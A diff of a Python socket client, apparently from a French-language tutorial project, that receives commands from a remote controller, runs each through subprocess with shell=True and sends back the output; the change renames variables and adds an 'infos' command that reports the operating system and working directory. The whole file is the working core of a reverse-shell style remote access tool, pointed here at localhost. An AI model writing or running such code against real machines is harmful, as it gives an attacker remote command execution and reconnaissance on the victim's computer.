@@ -1,6 +1,9 @@
 import socket
 import time
 import subprocess
+import platform
+
+import os
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -20,17 +23,21 @@ while True:
 
 # ....
 while True:
-    commande_data = s.recv(MAX_DATA_SIZE)
-    if not commande_data:
+    command_data = s.recv(MAX_DATA_SIZE)
+    if not command_data:
         break
-    commande = commande_data.decode()
-    print("Commande : ", commande)
-    response =  subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
-    response = response.stdout + response.stderr
-   
-    if not response or len(response) == 0:
-        response = " "
-        
+    command = command_data.decode()
+    print("Command : ", command)
+    
+    if command == "infos":
+        response = platform.platform() + " " + os.getcwd()
+    else:
+        response =  subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
+        response = response.stdout + response.stderr
+    
+        if not response or len(response) == 0:
+            response = " "
+            
 # Gestion des commandes trop longues: 
 # HEADER 13 octets -> longueur data
 # DATA (longueur) octets 
